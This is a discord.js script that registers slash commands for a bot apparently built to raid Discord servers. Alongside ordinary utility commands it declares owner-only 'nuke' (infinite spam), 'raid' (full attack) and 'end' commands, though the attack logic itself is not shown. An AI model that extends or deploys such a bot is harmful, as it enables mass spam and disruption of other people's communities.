const { REST, Routes, SlashCommandBuilder } = require('discord.js');
require('dotenv').config();

const commands = [
  // ============ COMANDOS DE ATAQUE ============
  new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('🔥 NUKE - Spam REVOLUTION infinito (DONO)'),

  new SlashCommandBuilder()
    .setName('raid')
    .setDescription('🔥 RAID - Ataque completo (DONO)')
    .addStringOption(option =>
      option.setName('motivo')
        .setDescription('Motivo do ataque')
        .setRequired(false)),

  new SlashCommandBuilder()
    .setName('end')
    .setDescription('🛑 PARA TODOS OS ATAQUES (DONO)'),

  // ============ COMANDOS DO DIA A DIA ============
  new SlashCommandBuilder()
    .setName('ping')
    .setDescription('🏓 Verificar latência do bot'),

  new SlashCommandBuilder()
    .setName('info')
    .setDescription('📊 Informações do servidor'),

  new SlashCommandBuilder()
    .setName('avatar')
    .setDescription('🖼️ Ver avatar de um usuário')
    .addUserOption(option =>
      option.setName('usuario')
        .setDescription('Usuário para ver o avatar')
        .setRequired(false)),

  new SlashCommandBuilder()
    .setName('say')
    .setDescription('💬 Repetir uma mensagem')
    .addStringOption(option =>
      option.setName('mensagem')
        .setDescription('Mensagem para repetir')
        .setRequired(true)),

  new SlashCommandBuilder()
    .setName('clear')
    .setDescription('🧹 Limpar mensagens do chat')
    .addIntegerOption(option =>
      option.setName('quantidade')
        .setDescription('Número de mensagens (1-100)')
        .setRequired(true)
        .setMinValue(1)
        .setMaxValue(100)),

  new SlashCommandBuilder()
    .setName('userinfo')
    .setDescription('👤 Informações de um usuário')
    .addUserOption(option =>
      option.setName('usuario')
        .setDescription('Usuário para ver informações')
        .setRequired(false))
];

const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log('🚀 REGISTRANDO COMANDOS REVOLUTION...');
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands.map(cmd => cmd.toJSON()) }
    );
    console.log('✅ COMANDOS REVOLUTION REGISTRADOS!');
    console.log('📱 COMANDOS DISPONIVEIS:');
    console.log('  /nuke  - Spam REVOLUTION infinito');
    console.log('  /raid  - Ataque completo');
    console.log('  /end   - Para ataques');
    console.log('  /ping  - Latência');
    console.log('  /info  - Info do servidor');
    console.log('  /avatar - Avatar de usuário');
    console.log('  /say   - Repetir mensagem');
    console.log('  /clear - Limpar chat');
    console.log('  /userinfo - Info de usuário');
  } catch (error) {
    console.error('❌ ERRO:', error);
  }
})();
